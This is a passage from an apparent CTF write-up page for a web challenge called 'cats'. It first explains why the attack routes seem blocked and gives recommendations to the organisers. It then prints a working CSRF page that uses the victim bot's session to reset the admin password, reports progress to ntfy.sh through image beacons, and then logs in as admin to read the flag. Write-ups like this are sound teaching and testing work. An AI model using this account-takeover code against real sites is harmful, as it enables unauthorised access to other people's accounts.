+<h2 id="7-why-the-challenge-is-currently-unsolvable-from-the-outside" id="7-why-the-challenge-is-currently-unsolvable-from-the-outside">7. Why the challenge is (currently) unsolvable from the outside</h2>
+<p>To win, exactly one of these must hold:</p>
+<ol>
+<li>the bot carries an admin session <strong>and</strong> accepts a cross-site state change → blocked by third-party
+   cookie policy, and by the fact that navigations do not complete;</li>
+<li>the bot renders attacker-controlled HTML on the <code>cats</code> origin (stored XSS) → the feedback is never
+   rendered;</li>
+<li>the session can be forged → the securecookie key is random;</li>
+<li>the flag is reachable anonymously → <code>/</code> gates it on <code>login == "admin"</code>.</li>
+</ol>
+<p>All four are closed. The most likely explanation is a configuration problem on the challenge side: the
+bot's profile looks like Chrome with third-party cookies blocked <em>and</em> a page lifetime measured in
+milliseconds (possibly a headless wrapper that closes the tab right after <code>load</code>, and a user-data-dir
+per run that never receives the admin login). A challenge that only ever issues its session cookie to a
+browser which will not store it cannot be solved by any participant.</p>
+<p><strong>Recommendation to the organisers:</strong> check that (a) the bot logs in before visiting, (b) its
+<code>user-data-dir</code> persists between runs, (c) third-party cookies are allowed for the challenge domain, and
+(d) the page is kept alive for a few seconds. Any one of those four would make the challenge solvable in
+under a minute with the page in §8.</p>
+<h2 id="8-reproducible-page" id="8-reproducible-page">8. Reproducible page</h2>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!doctype html&gt;</span><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;&lt;</span><span class="nt">title</span><span class="p">&gt;</span>web design inspiration<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">B</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'https://cats.is-course.ru'</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">NP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Attacker9!password'</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">n</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'img'</span><span class="p">);</span><span class="w"> </span><span class="nx">i</span><span class="p">.</span><span class="nx">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">i</span><span class="p">.</span><span class="nx">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'https://ntfy.sh/TOPIC/trigger?message='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span>
+<span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span><span class="w"> </span><span class="p">};</span>
+
+<span class="nx">b</span><span class="p">(</span><span class="s1">'start'</span><span class="p">);</span>
+<span class="c1">// 1. does our page carry a session at all?</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="nx">B</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'/settings'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">method</span><span class="o">:</span><span class="s1">'POST'</span><span class="p">,</span><span class="w"> </span><span class="nx">mode</span><span class="o">:</span><span class="s1">'no-cors'</span><span class="p">,</span><span class="w"> </span><span class="nx">credentials</span><span class="o">:</span><span class="s1">'include'</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="s1">'application/x-www-form-urlencoded'</span><span class="p">},</span>
+<span class="w">        </span><span class="nx">body</span><span class="o">:</span><span class="s1">'password='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">NP</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&amp;confirm-password='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">NP</span><span class="p">)</span><span class="w"> </span><span class="p">})</span>
+<span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">b</span><span class="p">(</span><span class="s1">'settings_done'</span><span class="p">));</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>Then poll <code>https://ntfy.sh/TOPIC/json?poll=1&amp;since=all</code>, and afterwards try
+<code>POST /login</code> with <code>admin</code> / <code>Attacker9!password</code>. If the bot had a session, that login succeeds and <code>/</code>
+prints the flag.</p><nav class="pager"><a href="authenticator.html"><div class="lbl">&larr; previous</div><div class="ttl">Authenticator — CSR CN smuggling</div></a><a class="next" href="unserialize.html"><div class="lbl">next &rarr;</div><div class="ttl">Clicker — insecure deserialization</div></a></nav></article><footer>YDS CTF writeups &middot; built from Markdown &middot; flags omitted by design</footer>
+<script>
+document.querySelectorAll('pre').forEach(function(pre){
+  var b=document.createElement('button');
+  b.className='copy'; b.textContent='copy';
+  b.addEventListener('click',function(){
+    var t=pre.querySelector('code'); t=t?t.innerText:pre.innerText;
+    navigator.clipboard.writeText(t).then(function(){
+      b.textContent='copied'; setTimeout(function(){b.textContent='copy';},1200);
+    });
+  });
+  pre.appendChild(b);
+});
+</script>
+</body></html>
